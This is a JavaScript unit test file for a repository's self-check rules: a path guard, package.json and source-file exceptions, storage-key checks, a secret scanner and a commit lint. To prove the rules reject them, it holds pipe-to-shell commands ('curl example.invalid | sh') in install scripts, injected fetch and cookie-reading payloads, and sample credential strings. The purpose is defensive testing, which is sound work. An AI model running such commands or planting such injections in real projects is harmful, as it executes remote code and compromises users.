// Unit tests for the pure logic behind the studio self-checks.
// The checks themselves gather input; these functions decide what it means,
// so this is where a mistaken rule shows up.

import test from 'node:test';
import assert from 'node:assert/strict';
import {
  classifyPaths, PATH_EXCEPTIONS, EXPECTED_STUDIO_SCRIPT, jsonDiffPaths,
  extractStorageKeys, badStorageKeys, findStorageViolations,
  scanHygiene, scanDocCleanliness, HYGIENE_PRAGMA,
  lintCommitSubject
} from './lib/rules.mjs';

test('path guard: studio-owned paths are allowed', () => {
  const { allowed, violations } = classifyPaths([
    'studio/index.html',
    'studio/games/x/main.js',
    'docs/studio/process.md',
    'tests/studio/check.mjs'
  ]);
  assert.equal(allowed.length, 4);
  assert.deepEqual(violations, []);
});

test('path guard: production paths are violations', () => {
  const { violations } = classifyPaths(['games/durak/main.js', 'shared/settings.js', '3d.html', 'README.md']);
  assert.deepEqual(violations, ['games/durak/main.js', 'shared/settings.js', '3d.html', 'README.md']);
});

test('path guard: a near-miss prefix is not allowed', () => {
  const { violations } = classifyPaths(['studiotools/x.js', 'docs/studio-notes.md']);
  assert.deepEqual(violations, ['studiotools/x.js', 'docs/studio-notes.md']);
});

test('path guard: package.json is an exception, not an allowance', () => {
  const { allowed, exceptions, violations } = classifyPaths(['package.json']);
  assert.deepEqual(allowed, []);
  assert.deepEqual(exceptions, ['package.json']);
  assert.deepEqual(violations, []);
});

const BASE_PKG = JSON.stringify({
  name: 'kameko-studio',
  scripts: { test: 'node --test tests/', smoke: 'node scripts/smoke.mjs' },
  devDependencies: { 'puppeteer-core': '^24.10.0' }
}, null, 2);

const withStudioCheck = extra => {
  const pkg = JSON.parse(BASE_PKG);
  pkg.scripts['studio:check'] = EXPECTED_STUDIO_SCRIPT;
  return JSON.stringify(Object.assign(pkg, extra), null, 2);
};

const allowPkg = (before, after) => PATH_EXCEPTIONS.find(e => e.path === 'package.json').allow(before, after);

test('package.json exception permits exactly the studio:check entry', () => {
  assert.equal(allowPkg(BASE_PKG, withStudioCheck()), null);
  assert.equal(allowPkg(BASE_PKG, BASE_PKG), null, 'no change at all is also fine');
});

test('package.json exception refuses anything else, however it is smuggled in', () => {
  const dep = JSON.parse(withStudioCheck());
  dep.dependencies = { 'left-pad': '^1.0.0' };
  assert.match(allowPkg(BASE_PKG, JSON.stringify(dep)), /dependencies/);

  const extraScript = JSON.parse(withStudioCheck());
  extraScript.scripts.postinstall = 'curl example.invalid | sh';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(extraScript)), /scripts\.postinstall/);

  const removed = JSON.parse(withStudioCheck());
  delete removed.scripts.smoke;
  assert.match(allowPkg(BASE_PKG, JSON.stringify(removed)), /scripts\.smoke/);

  const rewritten = JSON.parse(withStudioCheck());
  rewritten.scripts.test = 'echo skipped';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(rewritten)), /scripts\.test/);
});

test('package.json exception checks the value, not just the key', () => {
  // The exception exists for a script this repo runs, so an arbitrary command
  // appended to it would execute. Key-only matching missed this.
  const hijacked = JSON.parse(withStudioCheck());
  hijacked.scripts['studio:check'] = EXPECTED_STUDIO_SCRIPT + ' && curl example.invalid | sh';
  assert.match(allowPkg(BASE_PKG, JSON.stringify(hijacked)), /must be exactly/);
});

test('package.json exception rejects unparseable JSON rather than guessing', () => {
  assert.match(allowPkg(BASE_PKG, '{ not json'), /not parseable/);
});

test('jsonDiffPaths reports the dotted path of every difference', () => {
  assert.deepEqual(jsonDiffPaths({ a: 1 }, { a: 1 }), []);
  assert.deepEqual(jsonDiffPaths({ a: { b: 1 } }, { a: { b: 2 } }), ['a.b']);
  assert.deepEqual(jsonDiffPaths({}, { a: 1 }), ['a']);
  assert.deepEqual(jsonDiffPaths({ a: 1 }, {}), ['a']);
  assert.deepEqual(jsonDiffPaths({ a: [1, 2] }, { a: [1, 3] }), ['a']);
});

test('storage keys: literal, concatenated and interpolated forms are all found', () => {
  const code = `
    localStorage.getItem('studio_theme');
    localStorage.setItem("studio_seen", "1");
    sessionStorage.removeItem(\`studio_tmp\`);
    localStorage.setItem('studio_run_' + id, v);
    localStorage.getItem(\`studio_slot_\${n}\`);
  `;
  const keys = extractStorageKeys(code).map(k => k.key);
  assert.deepEqual(keys.sort(), ['studio_run_', 'studio_seen', 'studio_slot_', 'studio_theme', 'studio_tmp'].sort());
  assert.deepEqual(badStorageKeys(code), []);
});

test('storage keys: production keys are caught, including dynamic ones', () => {
  const code = `
    localStorage.getItem('theme');
    localStorage.setItem('riverRunHighScore', s);
    localStorage.setItem('durak_name_' + seat, n);
  `;
  assert.deepEqual(badStorageKeys(code).sort(), ['durak_name_', 'riverRunHighScore', 'theme']);
});

test('storage keys: a fully computed key cannot be verified, so it is reported', () => {
  const code = 'localStorage.setItem(keyFor(slot), v);';
  assert.deepEqual(badStorageKeys(code), ['keyFor(slot']);
});

test('storage: every route to the shared origin is checked, not just three methods', () => {
  // Each of these was waved through by the first version of the rule.
  const cases = {
    "localStorage['kameko_highScore'] = '1';": /bracket access/,
    'delete localStorage.kameko_other;': /delete of a key/,
    'localStorage.clear();': /clear\(\)/,
    'sessionStorage?.clear()': /clear\(\)/,
    "localStorage?.setItem('riverRunHighScore', 1)": /riverRunHighScore/,
    "localStorage . setItem('theme','dark')": /theme/,
    "window.localStorage.setItem('theme','x')": /theme/,
    'const ls = localStorage;': /aliased/
  };
  for (const [code, expected] of Object.entries(cases)) {
    const found = findStorageViolations(code);
    assert.ok(found.length, `expected a violation for: ${code}`);
    assert.match(found.join(' | '), expected);
  }
});

test('storage: a computed key is never trusted, even when it reads like a studio key', () => {
  // `studio_key` here is a variable; its runtime value is unknown.
  assert.match(findStorageViolations('localStorage.setItem(studio_key, v);').join(''), /computed/);
  assert.match(findStorageViolations('localStorage.setItem(keyFor(slot), v);').join(''), /computed/);
  assert.match(findStorageViolations("localStorage[k] = '1';").join(''), /computed/);
});

test('storage: the legitimate patterns stay legitimate', () => {
  assert.deepEqual(findStorageViolations("localStorage.setItem('studio_' + name, v);"), []);
  assert.deepEqual(findStorageViolations('localStorage.getItem(`studio_slot_${n}`);'), []);
  assert.deepEqual(findStorageViolations("localStorage.getItem('studio_visitCount');"), []);
  assert.deepEqual(findStorageViolations("localStorage['studio_theme'] = 'dark';"), []);
});

test('storage: extraction records how the key was written', () => {
  const kinds = code => extractStorageKeys(code).map(k => k.kind);
  assert.deepEqual(kinds("localStorage.getItem('studio_a')"), ['literal']);
  assert.deepEqual(kinds("localStorage.getItem('studio_' + i)"), ['prefix']);
  assert.deepEqual(kinds('localStorage.getItem(`studio_${i}`)'), ['prefix']);
  assert.deepEqual(kinds('localStorage.getItem(someVar)'), ['computed']);
});

test('hygiene: catches secrets, identifiers and private paths', () => {
  const cases = {
    'private-key': '-----BEGIN RSA PRIVATE KEY-----',  // studio-check:allow
    'aws-key': 'const k = "AKIAIOSFODNN7EXAMPLE";',  // studio-check:allow
    'bearer-secret': 'const api_key = "sk-abcdef123456789";',  // studio-check:allow
    'gh-token': 'ghp_abcdefghijklmnopqrstuvwxyz0123',  // studio-check:allow
    'email': 'contact someone@example.com for access',  // studio-check:allow
    'phone': 'call 555-867-5309 to confirm',  // studio-check:allow
    'home-path': 'cd /Users/someone/Projects',  // studio-check:allow
    'cloud-drive': 'the notes live in Mobile Documents/whatever',  // studio-check:allow
    'wikilink': 'see [[Some Private Note]] for context',  // studio-check:allow
    'street-address': 'the office at 1600 Pennsylvania Avenue'  // studio-check:allow
  };
  for (const [id, line] of Object.entries(cases)) {
    const found = scanHygiene(line).map(f => f.id);
    assert.ok(found.includes(id), `expected ${id} for: ${line} (got ${found.join(',') || 'nothing'})`);
  }
});

test('hygiene: clean text is clean, and the pragma exempts a quoted rule', () => {
  assert.deepEqual(scanHygiene('The gallery renders a card per studio game.'), []);
  assert.deepEqual(scanHygiene(`a wikilink looks like [[this]] <!-- ${HYGIENE_PRAGMA} -->`), []);  // studio-check:allow
});

test('hygiene: reports the line number', () => {
  const [finding] = scanHygiene('clean\nclean\ncontact someone@example.com');  // studio-check:allow
  assert.equal(finding.line, 3);
});

test('doc cleanliness: stacked corrections and historical sections are caught', () => {
  assert.equal(scanDocCleanliness('## Revision history\n').length, 1);
  assert.equal(scanDocCleanliness('### Superseded approach\n').length, 1);
  assert.equal(scanDocCleanliness('UPDATE: this is no longer true\n').length, 1);
  assert.equal(scanDocCleanliness('**EDIT:** actually we do it the other way\n').length, 1);
});

test('doc cleanliness: a decision record may record being superseded', () => {
  const adr = '# ADR-0007 — something\n\n## Superseded by ADR-0009\n';
  assert.equal(scanDocCleanliness(adr, { isDecisionRecord: true }).length, 0);
  assert.equal(scanDocCleanliness(adr, { isDecisionRecord: false }).length, 1);
});

test('doc cleanliness: ordinary prose passes', () => {
  const doc = '# Process\n\nOne run is one iteration.\n\n## Ceremonies\n\n- Planning\n';
  assert.deepEqual(scanDocCleanliness(doc), []);
});

test('commit lint: accepts a conventional studio commit', () => {
  assert.equal(lintCommitSubject('feat(studio): SS-003 add the path-guard check'), null);
  assert.equal(lintCommitSubject('docs(studio): SS-001 add the engineering handbook'), null);
});

test('commit lint: rejects a missing scope, ticket or type', () => {
  assert.match(lintCommitSubject('add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat: SS-003 add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat(studio): add the path guard'), /expected/);
  assert.match(lintCommitSubject('feat(studio): SS-3 add the path guard'), /expected/);
});

test('commit lint: exemption comes from the parent count, not the word "Merge"', () => {
  assert.equal(lintCommitSubject('Merge ss-003-self-checks: SS-003 self-checks', { parentCount: 2 }), null);
  // Subject matching made the lint opt-out: any message could start with "Merge".
  assert.match(lintCommitSubject('Merge in left-pad'), /expected/);
  assert.match(lintCommitSubject('Merge in left-pad', { parentCount: 1 }), /expected/);
});

test('commit lint: long subjects are rejected', () => {
  assert.match(lintCommitSubject('feat(studio): SS-003 ' + 'x'.repeat(80)), /characters/);
});

// --- The 3D landing page's portal capacity -----------------------------------

import { portalCapacity, allowOnlyFrontPortalRow, revertFrontPortalRow } from './lib/rules.mjs';

const CONSTANTS = n => `export const ARCADE_GAMES = [\n${
  Array.from({ length: n }, (_, i) => `    { name: "Game ${i}", url: "games/g${i}/", color: 0x00ff00 }`).join(',\n')
}\n];\n`;

/** A gameplay source with `rows` position tables of three, like the real one. */
const GAMEPLAY = (rows, { rotationsFor = null } = {}) => {
  const names = ['leftPositions', 'rightPositions', 'backPositions', 'frontPositions'].slice(0, rows);
  const table = name => `    const ${name} = [\n${
    Array.from({ length: 3 }, (_, i) => `        new THREE.Vector3(${i}, 2.5, ${i})`).join(',\n')
  }\n    ];\n`;
  const rotated = rotationsFor ?? names;
  return [
    'function createEnvironment() {\n',
    ...names.map(table),
    `    const positions = [${names.map(n => `...${n}`).join(', ')}];\n`,
    `    const rotations = [\n${rotated.map(n => `        ...${n}.map(() => 0)`).join(',\n')}\n    ];\n`,
    '}\n'
  ].join('');
};

test('portal capacity: a page with room for every game is clean', () => {
  const { games, slots, problems } = portalCapacity(GAMEPLAY(4), CONSTANTS(11));
  assert.equal(games, 11);
  assert.equal(slots, 12);
  assert.deepEqual(problems, []);
});

test('portal capacity: the defect this rule exists for is reported, with the count', () => {
  // Nine slots, eleven games — the state the landing page shipped in for months.
  const { games, slots, problems } = portalCapacity(GAMEPLAY(3), CONSTANTS(11));
  assert.equal(games, 11);
  assert.equal(slots, 9);
  assert.equal(problems.length, 1);
  assert.match(problems[0], /11 games but only 9 portal slots — the last 2 would be dropped silently/);
});

test('portal capacity: exactly enough slots is not a shortfall', () => {
  assert.deepEqual(portalCapacity(GAMEPLAY(3), CONSTANTS(9)).problems, []);
});

test('portal capacity: a position row with no matching rotation row is reported', () => {
  // The mistake adding a row invites: the portals render facing nowhere.
  const { problems } = portalCapacity(
    GAMEPLAY(4, { rotationsFor: ['leftPositions', 'rightPositions', 'backPositions'] }),
    CONSTANTS(11)
  );
  assert.equal(problems.length, 1);
  assert.match(problems[0], /frontPositions has positions but no matching rotations/);
});

test('portal capacity: a source it cannot read is reported, never assumed fine', () => {
  assert.match(portalCapacity(GAMEPLAY(3), 'export const SOMETHING_ELSE = [];').problems.join(),
    /could not find ARCADE_GAMES/);
  assert.match(portalCapacity('function createEnvironment() {}', CONSTANTS(11)).problems.join(),
    /could not find the positions table/);
  assert.match(portalCapacity(
    '    const positions = [...missingTable];\n    const rotations = [\n...missingTable.map(() => 0)\n];',
    CONSTANTS(11)
  ).problems.join(), /positions spreads missingTable, which is not declared as an array literal/);
});

// --- The shared/3d/gameplay.js exception -------------------------------------

const BASE_TABLES = `    const backPositions = [
        new THREE.Vector3(-roomWidth/4, 2.5, -roomDepth/2 + 1.2)
    ];
    const positions = [...leftPositions, ...rightPositions, ...backPositions];
    const rotations = [
        ...leftPositions.map(() => Math.PI/2),
        ...rightPositions.map(() => -Math.PI/2),
        ...backPositions.map(() => 0)
    ];
`;

const APPROVED_TABLES = `    const backPositions = [
        new THREE.Vector3(-roomWidth/4, 2.5, -roomDepth/2 + 1.2)
    ];
    // Front wall, above the trophy shelf. Three more slots, so the room holds
    // twelve portals rather than nine.
    const frontPositions = [
        new THREE.Vector3(-roomWidth/4, 4.0, roomDepth/2 - 1.2),
        new THREE.Vector3(roomWidth/4, 4.0, roomDepth/2 - 1.2),
        new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)
    ];
    const positions = [...leftPositions, ...rightPositions, ...backPositions, ...frontPositions];
    const rotations = [
        ...leftPositions.map(() => Math.PI/2),
        ...rightPositions.map(() => -Math.PI/2),
        ...backPositions.map(() => 0),
        ...frontPositions.map(() => Math.PI)
    ];
`;

const PREAMBLE = 'import * as THREE from "three";\nconst roomWidth = 18;\n';
const TAIL = '\n    ARCADE_GAMES.forEach((game, index) => {\n        if (!positions[index]) return;\n    });\n';

const before = PREAMBLE + BASE_TABLES + TAIL;
const after = PREAMBLE + APPROVED_TABLES + TAIL;

test('gameplay exception: the approved front-wall row is allowed', () => {
  assert.equal(revertFrontPortalRow(after), before);
  assert.equal(allowOnlyFrontPortalRow(before, after), null);
});

test('gameplay exception: an unchanged file is allowed', () => {
  assert.equal(allowOnlyFrontPortalRow(before, before), null);
});

test('gameplay exception: any other edit riding along is rejected', () => {
  // The whole point of a narrow exception: one approved change, nothing else.
  const smuggled = after.replace('const roomWidth = 18;', 'const roomWidth = 40;');
  assert.match(allowOnlyFrontPortalRow(before, smuggled), /changes beyond the front-wall portal row/);
});

test('gameplay exception: tampering inside the approved row is rejected', () => {
  const tampered = after.replace('new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)',
    'new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2); fetch("http://example.com")');
  assert.match(allowOnlyFrontPortalRow(before, tampered), /changes beyond the front-wall portal row/);
});

test('gameplay exception: a deleted line elsewhere is rejected', () => {
  const trimmed = after.replace('        if (!positions[index]) return;\n', '');
  assert.match(allowOnlyFrontPortalRow(before, trimmed), /changes beyond the front-wall portal row/);
});

test('gameplay exception: a trailing newline is content, not noise', () => {
  // The bug this test exists for: git output read through a trimming helper
  // lost the file's final newline, so the exception rejected its own edit.
  assert.match(allowOnlyFrontPortalRow(before.trimEnd(), after), /changes beyond the front-wall portal row/);
});

test('gameplay exception: a file absent from the base revision is rejected', () => {
  assert.match(allowOnlyFrontPortalRow('', after), /did not exist at the base revision/);
});

// --- The exception, attacked ------------------------------------------------
//
// Every payload below defeated an earlier version of the rule, which described
// an element as "a Vector3 call containing no parentheses". They are kept as
// the specification of what the whitelist has to exclude.

const withElement = text => after.replace('new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)', text);

test('exception: a tagged template inside the arguments is rejected', () => {
  // fetch`...` calls without a single parenthesis.
  assert.match(
    allowOnlyFrontPortalRow(before, withElement('new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2 + 0*!!fetch`https://example.com/x`)')),
    /changes beyond the front-wall portal row/);
});

test('exception: an assignment expression inside the arguments is rejected', () => {
  assert.match(
    allowOnlyFrontPortalRow(before, withElement('new THREE.Vector3(0, 4.0, window.__x = document.documentElement.innerHTML)')),
    /changes beyond the front-wall portal row/);
});

test('exception: a fourth element is rejected — the approved scope is three', () => {
  assert.match(
    allowOnlyFrontPortalRow(before, after.replace(
      'new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)\n',
      'new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2),\n        new THREE.Vector3(globalThis.x = 1, 0, 0)\n')),
    /changes beyond the front-wall portal row/);
});

test('exception: a two-element row is rejected — the shape is exact, not a minimum', () => {
  assert.match(
    allowOnlyFrontPortalRow(before, after.replace(
      '        new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)\n', '')),
    /changes beyond the front-wall portal row/);
});

test('exception: an argument may be arithmetic over identifiers, and nothing else', () => {
  // The forms the real edit needs must keep working, or the whitelist is useless.
  assert.equal(allowOnlyFrontPortalRow(before, withElement('new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)')), null);
  assert.equal(allowOnlyFrontPortalRow(before, withElement('new THREE.Vector3(-roomWidth/4, 4.0, roomDepth / 2 - 2.0)')), null);
  for (const bad of ['new THREE.Vector3(0, 4.0, f(1))', 'new THREE.Vector3(0, 4.0, a ? b : c)',
                     'new THREE.Vector3(0, 4.0, [1][0])', 'new THREE.Vector3(0, 4.0, 1; drop())',
                     'new THREE.Vector3(0, 4.0)', 'new THREE.Vector3(0, 4.0, 1, 2)']) {
    assert.match(allowOnlyFrontPortalRow(before, withElement(bad)), /changes beyond the front-wall portal row/, bad);
  }
});

test('exception: leading comment lines are permitted, and bounded', () => {
  // A comment cannot execute, and `hygiene` scans this file because it is an
  // exception path, so smuggled *text* is caught there. Unbounded insertion is
  // still outside the approved scope, so the block caps them.
  const two = after.replace('    // Front wall,', '    // one\n    // two\n    // Front wall,');
  assert.equal(allowOnlyFrontPortalRow(before, two), null);
  const many = after.replace('    // Front wall,', '    // pad\n'.repeat(12) + '    // Front wall,');
  assert.match(allowOnlyFrontPortalRow(before, many), /changes beyond the front-wall portal row/);
});

test('portal capacity: the same tables in a different order is reported', () => {
  const { problems } = portalCapacity(
    GAMEPLAY(4, { rotationsFor: ['leftPositions', 'backPositions', 'rightPositions', 'frontPositions'] }),
    CONSTANTS(11)
  );
  assert.equal(problems.length, 1);
  assert.match(problems[0], /different orders/);
});

// --- The capacity rule, attacked ---------------------------------------------
//
// Each of these reported a full room while the page would still drop games.
// They came from an independent QA pass and are kept as the rule's spec.

test('capacity: an entry whose first key is not `name` still counts', () => {
  // The rule counted /\{\s*name\s*:/ — so { url, name, color }, which is valid
  // and which nothing in production forbids, was invisible to it.
  const reordered = `export const ARCADE_GAMES = [\n${
    Array.from({ length: 11 }, (_, i) => `    { url: "games/g${i}/", name: "G${i}", color: 0 }`).join(',\n')
  }\n];\n`;
  assert.equal(portalCapacity(GAMEPLAY(4), reordered).games, 11);
  assert.match(portalCapacity(GAMEPLAY(3), reordered).problems.join(), /11 games but only 9 portal slots/);
});

test('capacity: a positions table that is truncated as it is built is reported', () => {
  const sliced = GAMEPLAY(4).replace('...frontPositions];', '...frontPositions].slice(0, 9);');
  assert.match(portalCapacity(sliced, CONSTANTS(11)).problems.join(),
    /could not find the positions table as a plain array of spreads/);
});

test('capacity: a positions table shortened afterwards is reported', () => {
  const shortened = GAMEPLAY(4).replace('    const rotations = [', '    positions.length = 9;\n    const rotations = [');
  assert.match(portalCapacity(shortened, CONSTANTS(11)).problems.join(), /shortened after it is built/);
});

test('capacity: a commented-out position is not a slot', () => {
  const holed = GAMEPLAY(4).replace(
    '        new THREE.Vector3(0, 2.5, 0),\n        new THREE.Vector3(1, 2.5, 1),',
    '        // new THREE.Vector3(0, 2.5, 0),\n        // new THREE.Vector3(1, 2.5, 1),');
  const { slots, problems } = portalCapacity(holed, CONSTANTS(11));
  assert.equal(slots, 10);
  assert.match(problems.join(), /11 games but only 10 portal slots/);
});

test('capacity: the positions table may hold only spreads', () => {
  const inlined = GAMEPLAY(3).replace('...backPositions];', '...backPositions, someOtherThing];');
  assert.match(portalCapacity(inlined, CONSTANTS(9)).problems.join(),
    /holds something other than spreads: \.\.\.leftPositions/);
});

// --- The exception, attacked again -------------------------------------------
//
// The payloads above were written against the rule as it was before the
// whitelist, so they say what the *previous* hole was and nothing about this
// one. These were written against the grammar that is in force now: each one
// passed the character-class version, and each is valid JavaScript that acts.

const RESERVED = 'new THREE.Vector3(0, 4.0, roomDepth/2 - 1.2)';  // the fixture's reserved slot
const withThirdArg = expr => after.replace(RESERVED, `new THREE.Vector3(0, 4.0, ${expr})`);

test('exception: an argument may not act, however few characters it uses', () => {
  // Every one of these is word characters, dots and arithmetic operators only —
  // which is why a character class could not exclude them. The grammar does,
  // by forbidding two operands with no operator between them.
  const payloads = {
    'delete engineState.walls': 'deletes a live object the room is built from',
    'delete window.localStorage': 'deletes a host property',
    'engineState.time++': 'assigns, using only +',
    '--state.counter': 'assigns, using only -',
    'new fetch': 'calls — `new` needs no parentheses',
    'new createGridTexture': 'calls a function in this very file',
    'void document.cookie': 'reads a getter',
    'typeof window': 'reads a getter',
    '1 /* pad */ + 1': 'smuggles a block comment inside an argument'
  };
  for (const [payload, why] of Object.entries(payloads)) {
    assert.match(allowOnlyFrontPortalRow(before, withThirdArg(payload)),
      /changes beyond the front-wall portal row/, `${payload} — ${why}`);
  }
});

test('exception: the arguments the real edit needs are still accepted', () => {
  // A whitelist that rejects the approved edit is not a whitelist, it is an
  // outage. These are every argument form the shipped row uses.
  for (const arg of ['roomDepth/2 - 1.2', '-roomWidth/4', '-roomWidth/2 + 2',
                     'roomDepth / 2 - 2.0', '4.0', '0']) {
    assert.equal(allowOnlyFrontPortalRow(before, withThirdArg(arg)), null, arg);
  }
});

test('exception: the approved row may not be relocated into another function', () => {
  // Reverting "the block, wherever it is" accepted the row moved verbatim
  // somewhere it would run at a different time.
  const block = after.slice(after.indexOf('    // Front wall'), after.indexOf('    const positions = ['));
  assert.ok(block.includes('frontPositions'), 'fixture did not yield the block');
  const moved = after.replace(block, '') + block;   // same bytes, somewhere else
  assert.match(allowOnlyFrontPortalRow(before, moved), /changes beyond the front-wall portal row/);
});

test('exception: positions without a matching rotation entry are rejected here, not only downstream', () => {
  const noRotation = after.replace(',\n        ...frontPositions.map(() => Math.PI)', '');
  assert.match(allowOnlyFrontPortalRow(before, noRotation), /no matching rotation entry/);
});
